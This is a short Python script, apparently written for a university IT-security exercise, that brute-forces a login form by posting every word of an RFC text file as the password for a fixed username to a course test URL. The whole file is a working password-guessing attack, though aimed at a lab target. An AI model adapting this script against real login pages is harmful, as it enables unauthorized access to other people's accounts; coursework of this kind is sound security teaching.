import requests
PATH = 'P1/rfc4960.txt'
url = 'http://sys.cs.uos.de/lehre/its/2020/aufgaben2/test'
values = {'username': 'ITS202021.',
          'password': 'pass'}

# print(requests.post(url, data=values).text)
with open(PATH, 'r') as reader:
    s = reader.readline()
    while s != '':
        for word in s.split():
            values['password'] = word
            print(values)
            r = requests.post(url, data=values)
            print(r.text)
            # if 'Authorization Required ' not in r.text:
            #     exit(1)
        s = reader.readline()
